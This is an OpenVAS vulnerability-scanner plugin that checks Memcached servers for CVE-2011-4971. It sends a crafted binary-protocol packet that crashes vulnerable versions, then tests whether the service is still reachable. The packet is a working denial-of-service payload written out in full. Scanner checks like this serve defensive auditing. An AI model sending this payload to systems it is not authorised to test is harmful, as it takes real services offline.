##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_memcached_remote_dos_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Memcached < 1.4.17 Remote Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:memcached:memcached";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902966");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2011-4971");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-04-30 12:50:48 +0530 (Tue, 30 Apr 2013)");
  script_name("Memcached < 1.4.17 Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Denial of Service");
  script_dependencies("gb_memcached_detect.nasl");
  script_mandatory_keys("Memcached/detected");

  script_xref(name:"URL", value:"http://insecurety.net/?p=872");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121445/killthebox.py.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/memcached-remote-denial-of-service");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause
  denial of service.");
  script_tag(name:"affected", value:"Memcached version 1.4.15 and prior.");
  script_tag(name:"insight", value:"The flaw is due to an error in handling of a specially crafted
  packet, that results to the Memcached segfault and essentially die.");
  script_tag(name:"solution", value:"Upgrade to  Memcached version 1.4.17 or later.");
  script_tag(name:"summary", value:"This host is running Memcached and is prone to denial of service
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://memcached.org");
  exit(0);
}

include("host_details.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_location_and_proto( cpe:CPE, port:port ) ) exit( 0 );

proto = infos["proto"];
if( proto == "udp" ) exit( 0 ); # Currently only TCP is covered below

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

data = string( "\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8",
               crap(data:raw_string(0x00), length:50 ) );

send( socket:soc, data:data );
close( soc );
sleep( 2 );

## If not able to create socket then application died.
soc2 = open_sock_tcp( port );
if( ! soc2 ) {
  security_message( port:port );
  exit( 0 );
}

close( soc2 );
exit( 99 );